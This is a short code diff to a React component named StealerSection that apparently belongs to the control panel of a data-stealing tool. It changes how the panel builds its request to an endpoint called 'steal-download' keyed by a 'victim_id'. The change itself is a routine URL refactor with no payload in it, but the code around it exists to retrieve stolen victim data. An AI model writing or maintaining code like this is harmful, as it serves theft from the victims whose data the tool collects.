@@ -79,7 +79,8 @@ export function StealerSection() {
       }
       setDownloading(true);
       try {
-         const res = await fetch(`/api/steal-download?victim_id=${encodeURIComponent(victimId)}`, {
+         const url = new URL(`/api/steal-download?victim_id=${encodeURIComponent(victimId)}`, window.location.origin);
+         const res = await fetch(url.toString(), {
             credentials: "same-origin",
             headers: csrfHeaders(),
          });
